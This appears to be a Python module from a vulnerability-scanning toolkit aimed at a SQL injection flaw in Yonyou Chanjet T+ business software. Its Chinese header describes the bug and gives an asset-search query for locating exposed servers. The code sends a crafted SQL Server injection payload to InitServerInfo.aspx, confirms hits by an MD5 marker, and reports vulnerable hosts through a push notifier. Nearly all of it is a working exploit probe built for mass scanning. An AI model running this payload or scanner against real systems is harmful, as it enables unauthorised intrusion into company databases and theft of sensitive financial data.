# 用友畅捷通TPlus InitServerInfo存在SQL注入漏洞
# 一、漏洞简介
# 畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。用友畅捷通TPlus InitServerInfo存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。
# 二、资产测绘
# hunnter:app.name="畅捷通 T+"

import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

bugName = '用友畅捷通TPlus InitServerInfo存在SQL注入漏洞'


def scan_YouyongTPlus_InitServerInfo_SQL_injection(url, proxies, headers, append_to_output, serverJ,bugName):
    path = "/tplus/UFAQD/InitServerInfo.aspx?preload=1"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }
    data = "operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))))%2b'1"

    encodetext = url + path

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=3, proxies=proxies)
        if req.status_code == 200 or req.status_code == 500:
            if '0xc4ca4238a0b923820dcc509a6f75849b' in req.text:
                append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                ServerJ.sc_send({bugName}, f"漏洞连接: {url}\r ", ServerJ_switch=serverJ)
            else:
                pass
                # append_to_output(f"[-] {url} 不存在{bugName}", "green")
        else:
            pass
            # append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
